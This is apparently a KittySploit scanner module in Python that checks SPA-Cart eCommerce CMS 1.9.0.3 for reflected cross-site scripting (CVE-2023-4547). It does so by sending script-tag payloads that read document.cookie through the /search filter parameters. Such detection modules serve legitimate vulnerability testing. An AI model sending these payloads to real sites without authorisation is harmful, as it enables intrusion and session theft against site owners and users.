#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A vulnerability was found in SPA-Cart eCommerce CMS 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'SPA-Cart eCommerce CMS 1.9.0.3 - Cross-Site Scripting Detection',
        'description': 'A vulnerability was found in SPA-Cart eCommerce CMS 1.9.0.3. It has been rated as problematic. Affected by this issue is some unknown functionality of the file /search. The manipulation of the argument filter[brandid]/filter[price] leads to cross site scripting. The attack may be launched remotely. VDB-238058 is the identifier assigned to this vulnerability.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'spa-cart', 'unauth', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://spa-cart.com',
            'https://cxsecurity.com/ascii/WLB-2023080090',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-4547',
            'https://vuldb.com/?ctiid.238058',
            'https://vuldb.com/?id.238058',
        ],
        'cve': 'CVE-2023-4547',
    }

    def run(self):
        for path in ('/search?filtered=1&q=test&filter[price]=100-1331"><script>alert(document.cookie)</script>&filter[attr][Memory][]=16+GB', '/search?filter[brandid]=vnxjb"><script>alert(document.cookie)</script>bvu51'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_any = ('100-1331"><script>alert(document.cookie)</script>', '><script>alert(document.cookie)</script>bvu51', '<table class="products-nav">',)
            header_any = ('text/html',)
            if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='medium',
                    reason="SPA-Cart eCommerce CMS 1.9.0.3 - Cross-Site Scripting detected",
                    path=path,
                )
                return True
        return False

